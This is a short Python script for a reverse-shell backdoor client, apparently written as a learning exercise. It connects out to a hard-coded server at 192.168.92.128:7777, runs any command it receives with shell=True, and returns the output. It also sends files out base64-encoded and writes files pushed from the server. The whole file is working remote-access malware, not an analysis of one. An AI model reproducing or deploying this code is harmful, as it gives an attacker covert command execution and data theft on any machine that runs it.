#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64

def send_j(data):
    json_data = json.dumps(data)
    print(json_data)
    s.send(json_data.encode('utf-8'))

def recv_j():
        data = ""
        while True:
            try:
                data = data + s.recv(1024).decode('utf-8')
                print(data)#receiving chunks of 1024 bytes until json.loads(data) returns a correct json format
                return json.loads(data) #
            except ValueError: #if the output of json.loads(data) is not complete (not in json format)a
                continue

def shell():
    while True:
        cmd = recv_j() # receive command from server
        if cmd == "exit_client":
            break
        elif cmd[:2] == "cd" and len(cmd) > 1:
            try:
                os.chdir(cmd[3:]) #change directory to what's after "cd"
            except:
                continue
        elif cmd[:8] == "download":
            with open(cmd[9:], "rb") as f:
                send_j(base64.b64encode(f.read()).decode('utf-8'))

        elif cmd[:6] == "upload":
            with open(cmd[9:], "wb") as f:
                res = recv_j()
                f.write(base64.b64decode(res))
        else:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            send_j(output.decode('utf-8')) #send output to server

#socket creation
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connect
s.connect(("192.168.92.128",7777)) #server IP and to which port to connect to
shell()
s.close()